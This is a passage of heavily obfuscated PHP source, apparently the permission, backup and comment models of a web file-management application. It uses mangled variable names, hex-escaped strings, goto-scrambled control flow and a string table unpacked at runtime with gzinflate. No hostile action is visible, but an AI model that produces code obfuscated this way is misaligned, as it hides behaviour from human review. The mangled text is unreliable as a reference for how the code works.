$a‰Ô½ÍŠİÇ[$c®ö—¢‹¬[187]], $c®ö—¢‹¬[29] => isset($a‰Ô½ÍŠİÇ[$c®ö—¢‹¬[29]]) ? $a‰Ô½ÍŠİÇ[$c®ö—¢‹¬[29]] : 1, $c®ö—¢‹¬[2430] => isset($a‰Ô½ÍŠİÇ[$c®ö—¢‹¬[2430]]) ? $a‰Ô½ÍŠİÇ[$c®ö—¢‹¬[2430]] : 0, $c®ö—¢‹¬[678] => 0, $c®ö—¢‹¬[180] => 0); return parent::insert($f»±ˆÎ); } public function userNoticeEdit($bÚ£ÖŒìÈ, $Eï—‡À·ŸÌ) { $this->initUserOption(); return parent::update($bÚ£ÖŒìÈ, $Eï—‡À·ŸÌ); } } goto cÛš‘Ñ”•ì; e­Á»À©: class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authDefault() { $EŒë‹˜‡Âä =& $_SERVER[£ü]; $FÜñç«›È = array(array($EŒë‹˜‡Âä[383] => LNG($EŒë‹˜‡Âä[2065]), $EŒë‹˜‡Âä[2066] => $EŒë‹˜‡Âä[2067], $EŒë‹˜‡Âä[2068] => 6, $EŒë‹˜‡Âä[2069] => 1, $EŒë‹˜‡Âä[2070] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($EŒë‹˜‡Âä[383] => LNG($EŒë‹˜‡Âä[2071]), $EŒë‹˜‡Âä[2066] => $EŒë‹˜‡Âä[2072], $EŒë‹˜‡Âä[2068] => 1, $EŒë‹˜‡Âä[2069] => 1, $EŒë‹˜‡Âä[2070] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($EŒë‹˜‡Âä[383] => LNG($EŒë‹˜‡Âä[2073]), $EŒë‹˜‡Âä[2066] => $EŒë‹˜‡Âä[2074], $EŒë‹˜‡Âä[2068] => 2, $EŒë‹˜‡Âä[2069] => 1, $EŒë‹˜‡Âä[2070] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($EŒë‹˜‡Âä[383] => LNG($EŒë‹˜‡Âä[2075]), $EŒë‹˜‡Âä[2066] => $EŒë‹˜‡Âä[2074], $EŒë‹˜‡Âä[2068] => 3, $EŒë‹˜‡Âä[2069] => 1, $EŒë‹˜‡Âä[2070] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($EŒë‹˜‡Âä[383] => LNG($EŒë‹˜‡Âä[2076]), $EŒë‹˜‡Âä[2066] => $EŒë‹˜‡Âä[2077], $EŒë‹˜‡Âä[2068] => 4, $EŒë‹˜‡Âä[2069] => 1, $EŒë‹˜‡Âä[2070] => self::AUTH_SHOW | self::AUTH_VIEW), array($EŒë‹˜‡Âä[383] => LNG($EŒë‹˜‡Âä[2078]), $EŒë‹˜‡Âä[2066] => $EŒë‹˜‡Âä[2079], $EŒë‹˜‡Âä[2068] => 5, $EŒë‹˜‡Âä[2069] => 1, $EŒë‹˜‡Âä[2070] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($EŒë‹˜‡Âä[383] => LNG($EŒë‹˜‡Âä[2080]), $EŒë‹˜‡Âä[2066] => $EŒë‹˜‡Âä[2081], $EŒë‹˜‡Âä[2068] => 7, $EŒë‹˜‡Âä[2069] => 1, $EŒë‹˜‡Âä[2070] => 0)); return $FÜñç«›È; } public static function authCheck($CÏ§ ™åà, $d™É”»µÓ†) { $CÏ§ ™åà = intval($CÏ§ ™åà); if (_get($GLOBALS, $_SERVER[£ü][453])) { return !0; } if ($CÏ§ ™åà <= 0) { return !1; } if (($CÏ§ ™åà & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($CÏ§ ™åà & $d™É”»µÓ†); } public static function authCheckShow($b‘°µÚ’Š) { return self::authCheck($b‘°µÚ’Š, self::AUTH_SHOW); } public static function authCheckView($dÔÊ‡ÒïÅŠ) { return self::authCheck($dÔÊ‡ÒïÅŠ, self::AUTH_VIEW); } public static function authCheckDownload($a£‡†â…) { return self::authCheck($a£‡†â…, self::AUTH_DOWNLOAD); } public static function authCheckUpload($a–ÁÈ«„) { return self::authCheck($a–ÁÈ«„, self::AUTH_UPLOAD); } public static function authCheckEdit($CÊ¢®–å‡µ) { return self::authCheck($CÊ¢®–å‡µ, self::AUTH_EDIT); } public static function authCheckRemove($bä‘¹”¤«) { return self::authCheck($bä‘¹”¤«, self::AUTH_REMOVE); } public static function authCheckShare($f¢®º¹Ş—‡) { return self::authCheck($f¢®º¹Ş—‡, self::AUTH_SHARE); } public static function authCheckComment($eÇÑ“Íˆ›) { return self::authCheck($eÇÑ“Íˆ›, self::AUTH_COMMENT); } public static function authCheckEvent($añôç©­Ó) { return self::authCheck($añôç©­Ó, self::AUTH_EVENT); } public static function authCheckRoot($eŞ¯îîÑ¯) { return self::authCheck($eŞ¯îîÑ¯, self::AUTH_ROOT); } public static function authDisable($a¤…îóÌÆĞ, $c¶ÉÍœ·‘¢) { if (intval($a¤…îóÌÆĞ) <= 0) { return 0; } return intval($a¤…îóÌÆĞ) & ~$c¶ÉÍœ·‘¢; } public $optionType = "\x53\171\x73\x74\145\155\x2e\163\157\x75\x72\143\145\x41\x75\164\150\114\151\x73\x74"; public $field = array("\x6e\x61\155\145", "\x61\x75\164\x68", "\154\x61\x62\145\154", "\144\x69\163\160\154\141\171", "\163\x79\163\164\145\155", "\163\x6f\x72\164"); public function initData() { $B¨¼“¡ÌÊ = $this->authDefault(); foreach ($B¨¼“¡ÌÊ as $cÁÍÊ‰Àç) { $this->add($cÁÍÊ‰Àç); } } public function listData($a¤Ê‰Á‹‰ = false, $A­°Öî†§± = "\163\x6f\x72\164", $c†«Ä ö…š = false) { return parent::listData($a¤Ê‰Á‹‰, $A­°Öî†§±, $c†«Ä ö…š); } public function update($cÒ„½ôˆù†, $fõŒƒ…—Å) { $C¥²¯×ÑÂ =& $_SERVER[£ü]; $BÎ¼á™£«² = parent::listData($cÒ„½ôˆù†); $d­Ç²ö½Òë = $this->findByName($fõŒƒ…—Å[$C¥²¯×ÑÂ[28]]); if (!$BÎ¼á™£«² || $d­Ç²ö½Òë && $d­Ç²ö½Òë[$C¥²¯×ÑÂ[364]] != $BÎ¼á™£«²[$C¥²¯×ÑÂ[364]]) { return !1; } $this->filterAuth($fõŒƒ…—Å[$C¥²¯×ÑÂ[373]]); return parent::update($cÒ„½ôˆù†, $fõŒƒ…—Å); } public function remove($fÀÙ×îÇÅÖ) { $E±µÉô³Õì = parent::listData($fÀÙ×îÇÅÖ); if (!$E±µÉô³Õì || $E±µÉô³Õì[$_SERVER[£ü][1070]]) { return !1; } return parent::remove($fÀÙ×îÇÅÖ); } public function add($EºÌ‡ÕöĞò = array()) { goto D—’›ã”; D—’›ã”: $EŒ‚³Şãë =& $_SERVER[£ü]; if ($this->findByName($EºÌ‡ÕöĞò[$EŒ‚³Şãë[28]])) { return !1; } $dºõøÏ±Ï§ = array($EŒ‚³Şãë[28] => $EŒ‚³Şãë[33], $EŒ‚³Şãë[373] => 1, $EŒ‚³Şãë[2082] => $EŒ‚³Şãë[2083], $EŒ‚³Şãë[2084] => 1, $EŒ‚³Şãë[1070] => 0, $EŒ‚³Şãë[2085] => 0); goto f¦·™®¨ÖÔ; f¦·™®¨ÖÔ: $EºÌ‡ÕöĞò = array_merge($dºõøÏ±Ï§, $EºÌ‡ÕöĞò); $EºÌ‡ÕöĞò[$EŒ‚³Şãë[2085]] = $this->getSort(); $this->filterAuth($EºÌ‡ÕöĞò[$EŒ‚³Şãë[373]]); goto AÛ¤”„”Ÿù; AÛ¤”„”Ÿù: return parent::insert($EºÌ‡ÕöĞò); goto d®³¦¬¨‚ä; d®³¦¬¨‚ä: } private function getSort() { $DŒÈº¬Èª =& $_SERVER[£ü]; $BÇ«×Šé¯è = parent::listData(); $DŞÇµÁ…¯ = array_to_keyvalue($BÇ«×Šé¯è, $DŒÈº¬Èª[33], $DŒÈº¬Èª[2085]); return empty($DŞÇµÁ…¯) ? 0 : max($DŞÇµÁ…¯) + 1; } private function filterAuth(&$AÓŞ‘Ş×§Æ) { goto d›„¾–“–; d›„¾–“–: if (!$AÓŞ‘Ş×§Æ) { return; } $a‘ÜîÓ–Ñ“ = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $c‹¶Œ†¶Ş¿ = array(); goto Aù…ÆÜ÷¢†; Aù…ÆÜ÷¢†: foreach ($a‘ÜîÓ–Ñ“ as $dØ¶‰ìëãˆ) { if ($AÓŞ‘Ş×§Æ & $dØ¶‰ìëãˆ) { $c‹¶Œ†¶Ş¿[] = $dØ¶‰ìëãˆ; } } if (in_array(self::AUTH_ROOT, $c‹¶Œ†¶Ş¿)) { $AÓŞ‘Ş×§Æ = array_sum($a‘ÜîÓ–Ñ“); return; } $d·…ËÊŒÃ« = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); goto BÕŞ¨õˆœ; BÕŞ¨õˆœ: foreach ($c‹¶Œ†¶Ş¿ as $dØ¶‰ìëãˆ) { if (isset($d·…ËÊŒÃ«[$dØ¶‰ìëãˆ])) { $c‹¶Œ†¶Ş¿ = array_merge($c‹¶Œ†¶Ş¿, $d·…ËÊŒÃ«[$dØ¶‰ìëãˆ]); } } $c‹¶Œ†¶Ş¿[] = self::AUTH_SHOW; $AÓŞ‘Ş×§Æ = array_sum(array_unique($c‹¶Œ†¶Ş¿)); goto cÓÕ›ŒË²Ş; cÓÕ›ŒË²Ş: } public function sort($aÄ­„„¡öË, $B¢œøŒöæË) { return parent::update($aÄ­„„¡öË, $B¢œøŒöæË); } } class BackupModel extends ModelBaseLight { public $optionType = "\x53\171\163\x74\x65\155\56\x62\x61\143\153\165\160\114\x69\163\x74"; public $field = array("\151\x6f", "\156\141\155\x65", "\x73\164\x61\164\165\163", "\143\x6f\x6e\x74\145\x6e\x74", "\162\145\163\165\x6c\x74", "\164\x69\x6d\x65\106\162\x6f\155", "\164\x69\x6d\x65\124\x6f"); public function config() { goto FÓˆÙÕØ²; fæ’Ç‘ĞÕ: if (isset($Bò„¹·”Ú[$b¯ºÈèŠ¨[187]])) { $Bò„¹·”Ú[$b¯ºÈèŠ¨[187]] = json_decode($Bò„¹·”Ú[$b¯ºÈèŠ¨[187]], !0); } if (isset($f…áÊƒ´Ğ[$b¯ºÈèŠ¨[187]])) { $Bò„¹·”Ú[$b¯ºÈèŠ¨[187]][$b¯ºÈèŠ¨[1376]] = $f…áÊƒ´Ğ[$b¯ºÈèŠ¨[187]]; unset($f…áÊƒ´Ğ[$b¯ºÈèŠ¨[187]]); } return array_merge($Bò„¹·”Ú, $f…áÊƒ´Ğ); goto Cˆë£Êòßê; EŸó¾¤Ÿ»ã: Action($b¯ºÈèŠ¨[2086])->taskInit(); $b‘À’Š¶†â = Model($b¯ºÈèŠ¨[2087])->listData(); foreach ($b‘À’Š¶†â as $BÉ¡ÙºÕù‹) { if ($BÉ¡ÙºÕù‹[$b¯ºÈèŠ¨[1070]] == $b¯ºÈèŠ¨[83] && $BÉ¡ÙºÕù‹[$b¯ºÈèŠ¨[1389]] == $b¯ºÈèŠ¨[2088]) { $Bò„¹·”Ú = $BÉ¡ÙºÕù‹; break; } } goto fæ’Ç‘ĞÕ; aõµÓˆĞÜÎ: $f…áÊƒ´Ğ = is_array($f…áÊƒ´Ğ) ? $f…áÊƒ´Ğ : array(); if (!isset($f…áÊƒ´Ğ[$b¯ºÈèŠ¨[681]])) { $f…áÊƒ´Ğ[$b¯ºÈèŠ¨[681]] = $b¯ºÈèŠ¨[464]; } $Bò„¹·”Ú = array(); goto EŸó¾¤Ÿ»ã; FÓˆÙÕØ²: $b¯ºÈèŠ¨ =& $_SERVER[£ü]; $f…áÊƒ´Ğ = Model($b¯ºÈèŠ¨[1078])->get($b¯ºÈèŠ¨[701]); $f…áÊƒ´Ğ = json_decode($f…áÊƒ´Ğ, !0); goto aõµÓˆĞÜÎ; Cˆë£Êòßê: } public function listData($AÄ˜¨Ü´äÂ = false, $c¶¶ĞË…¼à = "\x6d\157\144\151\146\x79\x54\x69\x6d\x65", $eÓŠºÁ®Ì = false) { return parent::listData($AÄ˜¨Ü´äÂ, $c¶¶ĞË…¼à, !0); } public function lastItem() { $e×âîàªŠ¤ = $this->listData(); return !empty($e×âîàªŠ¤[0]) ? $e×âîàªŠ¤[0] : null; } public function kill($e›¶±ºĞ…) { goto Dõ£ĞÜ×‰; Dõ£ĞÜ×‰: $FäÑ´‹÷ =& $_SERVER[£ü]; $BÔ–§ë§ª = $this->listData($e›¶±ºĞ…); if (!$BÔ–§ë§ª || empty($BÔ–§ë§ª[$FäÑ´‹÷[28]])) { return !0; } goto a¼ßê–×Ş; CùäŞ»Ã: $DÁé‡Ì‚Ñ¨ = $BÔ–§ë§ª[$FäÑ´‹÷[28]]; $fñ­Ó×Ó = TEMP_FILES . $FäÑ´‹÷[699] . $DÁé‡Ì‚Ñ¨ . $FäÑ´‹÷[8]; IO::remove($fñ­Ó×Ó, !1); goto eÀ£ŒÇÀ¾; eÀ£ŒÇÀ¾: return $this->remove($e›¶±ºĞ…); goto eï‚‹Ú¦½; a¼ßê–×Ş: Task::kill($FäÑ´‹÷[700]); Task::kill($FäÑ´‹÷[718]); Task::kill($FäÑ´‹÷[732]); goto CùäŞ»Ã; eï‚‹Ú¦½: } public function remove($eÓÊ¢Ì¢Ÿğ) { $CÛÄñòù = $this->listData($eÓÊ¢Ì¢Ÿğ); if (!$CÛÄñòù) { return !0; } return $this->backupRemove($CÛÄñòù); } private function backupRemove($aä•„ øÕÛ) { $F›·Í¬àá“ =& $_SERVER[£ü]; parent::remove($aä•„ øÕÛ[$F›·Í¬àá“[364]]); $F¢…öÏë±‚ = "\173\151\157\x3a{$aä•„ øÕÛ[$F›·Í¬àá“[680]]}\x7d\x2f\x64\141\x74\141\142\x61\x73\145\57\142\x61\143\x6b\165\160\137" . $aä•„ øÕÛ[$F›·Í¬àá“[28]]; IO::remove($F¢…öÏë±‚, !1); return !0; } public function start() { goto C¸ÓÃ‡ê¿; F“º½íçìÛ: $a¯…¸ö× = new Backup(); $a¯…¸ö×->keep(); if (!$a¯…¸ö×->db()) { return !1; } goto cíÄ›ˆòâ’; cíÄ›ˆòâ’: if (!$a¯…¸ö×->dbFile()) { return !1; } if ($E†‹‡“—‚Á[$D ¥§µç­Ğ[681]] == $D ¥§µç­Ğ[464]) { $a¯…¸ö×->file(); } Backup::set(array($D ¥§µç­Ğ[678] => 1, $D ¥§µç­Ğ[692] => time())); goto eˆ¹†³ƒĞŞ; eˆ¹†³ƒĞŞ: return !0; goto CÈçÌ‡Óàù; C¸ÓÃ‡ê¿: $D ¥§µç­Ğ =& $_SERVER[£ü]; if ($GLOBALS[$D ¥§µç­Ğ[6]][$D ¥§µç­Ğ[84]][$D ¥§µç­Ğ[2089]] != $D ¥§µç­Ğ[83]) { return !0; } $E†‹‡“—‚Á = $this->config(); goto fâ¸¼æÛá; fâ¸¼æÛá: if (!$E†‹‡“—‚Á || $E†‹‡“—‚Á[$D ¥§µç­Ğ[1373]] != $D ¥§µç­Ğ[83]) { return !1; } $c·³°î¿å = $this->process(); foreach ($c·³°î¿å as $eÆ—Í‚µËÇ) { if ($eÆ—Í‚µËÇ) { return Task::restart($eÆ—Í‚µËÇ[$D ¥§µç­Ğ[364]]); } } goto F“º½íçìÛ; CÈçÌ‡Óàù: } public function process() { $f”èº Æâ± =& $_SERVER[£ü]; return array($f”èº Æâ±[683] => Task::get($f”èº Æâ±[700]), $f”èº Æâ±[686] => Task::get($f”èº Æâ±[718]), $f”èº Æâ±[164] => Task::get($f”èº Æâ±[732])); } public function restore() { $E®»‚äà«Â =& $_SERVER[£ü]; ActionCall($E®»‚äà«Â[2090], !0, 1); ActionCall($E®»‚äà«Â[2090], !0, 0); } } class CommentModel extends ModelBase { protected $tableName = "\x63\157\155\x6d\x65\x6e\164"; protected $tableMeta = array("\x74\141\142\154\145\116\141\155\x65" => "\143\157\x6d\155\x65\x6e\x74\137\155\145\x74\141", "\155\145\164\x61\x46\151\145\x6c\144" => "\143\157\x6d\155\145\x6e\164\111\x44"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($Fìôïç«…) { $d³Àªš·–Í =& $_SERVER[£ü]; if ($Fìôïç«…[$d³Àªš·–Í[2091]]) { $Añ¤ô£Ï„Ş = $this->where(array($d³Àªš·–Í[2092] => $Fìôïç«…[$d³Àªš·–Í[2091]]))->find(); if (!$Añ¤ô£Ï„Ş || $Añ¤ô£Ï„Ş[$d³Àªš·–Í[368]] != $Fìôïç«…[$d³Àªš·–Í[368]] || $Añ¤ô£Ï„Ş[$d³Àªš·–Í[452]] != $Fìôïç«…[$d³Àªš·–Í[452]]) { return !1; } $this->where(array($d³Àªš·–Í[2092] => $Fìôïç«…[$d³Àªš·–Í[2091]]))->setAdd($d³Àªš·–Í[2093], 1); } return $this->add($Fìôïç«…); } public function remove($aëğ±¼İ•²) { $b¤ÁÒÂ¤ó =& $_SERVER[£ü]; $EãÙÚì¢ø¡ = array($b¤ÁÒÂ¤ó[2092] => $aëğ±¼İ•²); $fí¨Ó»‚¡Õ = $this->where($EãÙÚì¢ø¡)->find(); if ($fí¨Ó»‚¡Õ[$b¤ÁÒÂ¤ó[2091]]) { $this->where(array($b¤ÁÒÂ¤ó[2092] => $fí¨Ó»‚¡Õ[$b¤ÁÒÂ¤ó[2091]]))->setAdd($b¤ÁÒÂ¤ó[2093], -1); } return $this->where($EãÙÚì¢ø¡)->delete(); } public function edit($c¢øÀÏî, $FÅÆÚ—ƒ) { $D¤Œ¨¤ÄÜ =& $_SERVER[£ü]; $C‰¬ô“¬®ˆ = array($D¤Œ¨¤ÄÜ[2092] => $c¢øÀÏî); return $this->where($C‰¬ô“¬®ˆ)->save(array($D¤Œ¨¤ÄÜ[2094] => $FÅÆÚ—ƒ)); } public function prasise($c½›Ø£•ï) { $aİ¿‰÷™˜¡ =& $_SERVER[£ü]; $c‰æô†·È¾ = Model($aİ¿‰÷™˜¡[2095]); $e©§Ò¿Ê¼è = array($aİ¿‰÷™˜¡[2092] => $c½›Ø£•ï, $aİ¿‰÷™˜¡[1392] => USER_ID); $a”ñ‡ê®ãé = $c‰æô†·È¾->where($e©§Ò¿Ê¼è)->find(); if (!$a”ñ‡ê®ãé) { $c‰æô†·È¾->add($e©§Ò¿Ê¼è); $F¢‹Ø›‹×Å = $this->where(array($aİ¿‰÷™˜¡[2092] => $c½›Ø£•ï))->setAdd($aİ¿‰÷™˜¡[2096], 1); } else { $c‰æô†·È¾->where($e©§Ò¿Ê¼è)->delete(); $F¢‹Ø›‹×Å = $this->where(array($aİ¿‰÷™˜¡[2092] => $c½›Ø£•ï))->setAdd($aİ¿‰÷™˜¡[2096], -1); } return $F¢‹Ø›‹×Å; } public function targetInfo($d¡ÀçŸ¨î˜, $Fè‰•ƒ‚ß²) { goto fƒŞ«ùç; fƒŞ«ùç: $cĞÈ¨â §± =& $_SERVER[£ü]; $FÈÁ™ƒ÷†¶ = array($cĞÈ¨â §±[517] => $d¡ÀçŸ¨î˜, $cĞÈ¨â §±[518] => $Fè‰•ƒ‚ß²); $B·î©ŒÒ“ä = $this->where($FÈÁ™ƒ÷†¶)->count(); goto e¿“ÇÆ½¹–; BÂØñÂ‘Ï°: return $e¶Œñ‘Ÿ¶; goto Bñ®”‚ìêƒ; e¿“ÇÆ½¹–: $eÈ„ÓÓÖ»º = "\122\x49\107\110\x54\x20\112\x4f\x49\x4e\40{$this->tablePrefix}\x63\157\x6d\x6d\x65\156\x74\137\160\162\141\151\163\145\40\163\164\141\162\40\157\x6e\x20\x63\x6f\x6d\x6d\x65\x6e\x74\56\143\157\155\155\x65\156\164\111\x44\40\75\40\163\x74\x61\x72\x2e\143\x6f\155\x6d\x65\156\164\x49\104"; $CÔ©‚½´ = $this->alias($cĞÈ¨â §±[338])->where($FÈÁ™ƒ÷†¶)->join($eÈ„ÓÓÖ»º, $cĞÈ¨â §±[2097])->count(); $e¶Œñ‘Ÿ¶ = array($cĞÈ¨â §±[2098] => $B·î©ŒÒ“ä, $cĞÈ¨â §±[2099] => $CÔ©‚½´); goto BÂØñÂ‘Ï°; Bñ®”‚ìêƒ: } public function listData($EÔÕÒİÂ…ù) { $aŠãË³Ëè¼ =& $_SERVER[£ü]; if (isset($EÔÕÒİÂ…ù[$aŠãË³Ëè¼[2100]])) { if ($EÔÕÒİÂ…ù[$aŠãË³Ëè¼[2100]]) { $EÔÕÒİÂ…ù[$aŠãË³Ëè¼[2101]] = array($aŠãË³Ëè¼[918], intval($EÔÕÒİÂ…ù[$aŠãË³Ëè¼[2100]])); } unset($EÔÕÒİÂ…ù[$aŠãË³Ëè¼[2100]]); } if (isset($EÔÕÒİÂ…ù[$aŠãË³Ëè¼[2102]])) { if ($EÔÕÒİÂ…ù[$aŠãË³Ëè¼[2102]]) { $EÔÕÒİÂ…ù[$aŠãË³Ëè¼[2101]] = array($aŠãË³Ëè¼[915], intval($EÔÕÒİÂ…ù[$aŠãË³Ëè¼[2102]])); } unset($EÔÕÒİÂ…ù[$aŠãË³Ëè¼[2102]]); } return $this->_listData($EÔÕÒİÂ…ù); } private function _listData($F¼—Ö¨¨ö®) { $eğ“¶ŒÑéœ =& $_SERVER[£ü]; $dì ¯®Ä¥¹ = $this->where($F¼—Ö¨¨ö®)->_makeOrder()->selectPage(100); $this->_listAppendParent($dì ¯®Ä¥¹[$eğ“¶ŒÑéœ[351]]); $this->_listAppendUser($dì ¯®Ä¥¹[$eğ“¶ŒÑéœ[351]]); $this->_listAppendMeta($dì ¯®Ä¥¹[$eğ“¶ŒÑéœ[351]]); return $dì ¯®Ä¥¹; } private function _makeOrder() { $dÉÊÙâİÙ =& $_SERVER[£ü]; $Cğ¿Áê®¸ = array($dÉÊÙâİÙ[2096], $dÉÊÙâİÙ[2093], $dÉÊÙâİÙ[184]); $b±Ÿ›ÔÇ– = Input::get($dÉÊÙâİÙ[403], $dÉÊÙâİÙ[7], $dÉÊÙâİÙ[386], $Cğ¿Áê®¸); $a™Ø‰å— = Input::get($dÉÊÙâİÙ[404], $dÉÊÙâİÙ[7], $dÉÊÙâİÙ[1394], array($dÉÊÙâİÙ[2103], $dÉÊÙâİÙ[401])); $DíÆÇÈÊ– = $b±Ÿ›ÔÇ– . $dÉÊÙâİÙ[50] . $a™Ø‰å—; return $this->order($DíÆÇÈÊ–); } private function _listAppendParent(&$döÃÅĞ›Ñ—) { goto E‡óéÀ¬í; c¤‘İòšÃâ: if (!$BÁÉÔïó) { return; } $DÇÓ£‹šöÆ = $this->where(array($C›Ñ§Ï´·[2092] => array($C›Ñ§Ï´·[7], $BÁÉÔïó)))->select(); $DÇÓ£‹šöÆ = array_to_keyvalue($DÇÓ£‹šöÆ, $C›Ñ§Ï´·[2101]); goto b¶¹…ëÜ¬ñ; E‡óéÀ¬í: $C›Ñ§Ï´· =& $_SERVER[£ü]; $BÁÉÔïó = array_unique(array_to_keyvalue($döÃÅĞ›Ñ—, $C›Ñ§Ï´·[33], $C›Ñ§Ï´·[2091])); $BÁÉÔïó = array_remove_value($BÁÉÔïó, $C›Ñ§Ï´·[464]); goto c¤‘İòšÃâ; b¶¹…ëÜ¬ñ: foreach ($döÃÅĞ›Ñ— as &$BĞŠƒ²‹á) { if (isset($DÇÓ£‹šöÆ[$BĞŠƒ²‹á[$C›Ñ§Ï´·[2091]]])) { $BĞŠƒ²‹á[$C›Ñ§Ï´·[2104]] = $DÇÓ£‹šöÆ[$BĞŠƒ²‹á[$C›Ñ§Ï´·[2091]]]; } } goto A¬¾Ô”Ô“é; A¬¾Ô”Ô“é: } private function _listAppendUser(&$aÜƒö¾¤ëŠ) { goto bÑ«’¯†ˆ; bÑ«’¯†ˆ: $F÷æô®‚ƒ× =& $_SERVER[£ü]; $f¸“ß˜¨ = array_unique(array_to_keyvalue($aÜƒö¾¤ëŠ, $F÷æô®‚ƒ×[33], $F÷æô®‚ƒ×[1401])); $f¸“ß˜¨ = array_remove_value($f¸“ß˜¨, $F÷æô®‚ƒ×[464]); goto cë½…§ÒÔ; b‹Ìğ†Ÿ²: foreach ($aÜƒö¾¤ëŠ as &$aêÍå´”¨å) { $aêÍå´”¨å[$F÷æô®‚ƒ×[531]] = $b†¹‡ºÎ‚•[$aêÍå´”¨å[$F÷æô®‚ƒ×[1401]]]; if (isset($aêÍå´”¨å[$F÷æô®‚ƒ×[2104]])) { $aêÍå´”¨å[$F÷æô®‚ƒ×[2104]][$F÷æô®‚ƒ×[531]] = $b†¹‡ºÎ‚•[$aêÍå´”¨å[$F÷æô®‚ƒ×[2104]][$F÷æô®‚ƒ×[1401]]]; } } goto cƒ¥Œš¦šò; cë½…§ÒÔ: if (count($f¸“ß˜¨) == 0) { return; } foreach ($aÜƒö¾¤ëŠ as $aêÍå´”¨å) { if (isset($aêÍå´”¨å[$F÷æô®‚ƒ×[2104]])) { $f¸“ß˜¨[] = $aêÍå´”¨å[$F÷æô®‚ƒ×[2104]][$F÷æô®‚ƒ×[1401]]; } } $b†¹‡ºÎ‚• = Model($F÷æô®‚ƒ×[473])->userListInfo($f¸“ß˜¨); goto b‹Ìğ†Ÿ²; cƒ¥Œš¦šò: } private function _listAppendMeta(&$b¥Äš«—Ê) { goto CÖ‰‘¨¨°; e·£¬°ò‹: if (!$Fó…¾´³ó) { return !1; } foreach ($b¥Äš«—Ê as &$EäÊÓ’å‰) { $EäÊÓ’å‰[$EÆÛˆµÔ›¶[413]] = $Fó…¾´³ó[$EäÊÓ’å‰[$EÆÛˆµÔ›¶[2101]]]; if (isset($EäÊÓ’å‰[$EÆÛˆµÔ›¶[2104]])) { $EäÊÓ’å‰[$EÆÛˆµÔ›¶[2104]][$EÆÛˆµÔ›¶[413]] = $Fó…¾´³ó[$EäÊÓ’å‰[$EÆÛˆµÔ›¶[2104]][$EÆÛˆµÔ›¶[2101]]]; } } goto Fù˜¾­¯µ; CÖ‰‘¨¨°: $EÆÛˆµÔ›¶ =& $_SERVER[£ü]; $e¯î™ãÕô¾ = array_unique(array_to_keyvalue($b¥Äš«—Ê, $EÆÛˆµÔ›¶[33], $EÆÛˆµÔ›¶[2101])); $e¯î™ãÕô¾ = array_remove_value($e¯î™ãÕô¾, $EÆÛˆµÔ›¶[464]); goto DÉôƒô—èß; DÉôƒô—èß: if (!$e¯î™ãÕô¾) { return; } foreach ($b¥Äš«—Ê as $EäÊÓ’å‰) { if (isset($EäÊÓ’å‰[$EÆÛˆµÔ›¶[2104]])) { $e¯î™ãÕô¾[] = $EäÊÓ’å‰[$EÆÛˆµÔ›¶[2104]][$EÆÛˆµÔ›¶[2101]]; } } $Fó…¾´³ó = $this->metaList($e¯î™ãÕô¾); goto e·£¬°ò‹; Fù˜¾­¯µ: } private function metaList($Fæ‹øŒ·) { goto f°ğ‚ØùÈâ; f°ğ‚ØùÈâ: $fáí²©Îº— =& $_SERVER[£ü]; if (!$Fæ‹øŒ·) { return array(); } $b©Ğù¹í = array($fáí²©Îº—[2101] => array($fáí²©Îº—[7], $Fæ‹øŒ·)); goto eÜïÅ‘ãŞ‘; aš“·¬ŒÕˆ: return $eêÔä£¿†É ? $eêÔä£¿†É : array(); goto b‰­éˆä; eÜïÅ‘ãŞ‘: $eêÔä£¿†É = Model($fáí²©Îº—[2105])->where($b©Ğù¹í)->select(); $eêÔä£¿†É = array_to_keyvalue_group($eêÔä£¿†É, $fáí²©Îº—[2101]); foreach ($eêÔä£¿†É as $eßÆ‚‡ÒŠâ => $E‘„õìİ·) { $AÔƒŞ‚¹‡ö = array(); foreach ($E‘„õìİ· as $C‰÷¯™ã©¥) { $AÔƒŞ‚¹‡ö[$C‰÷¯™ã©¥[$fáí²©Îº—[89]]] = $C‰÷¯™ã©¥[$fáí²©Îº—[356]]; } $eêÔä£¿†É[$eßÆ‚‡ÒŠâ] = $AÔƒŞ‚¹‡ö; } goto aš“·¬ŒÕˆ; b‰­éˆä: } } goto f¹ŸùŞù‚À; dÔ©©®ÕÚ: $d×ÇÑöÏ¹˜ = $_SERVER[£ü][543]; $_SERVER[òÀÆ×ø] = explode($_SERVER[£ü][544], gzinflate(substr($_SERVER[£ü][545], 10, -8))); $f÷Ùµ‰ìÆ = $_SERVER[£ü][546]; goto b¬ï”†Â‰; C–†ĞÑ»¦ñ: if 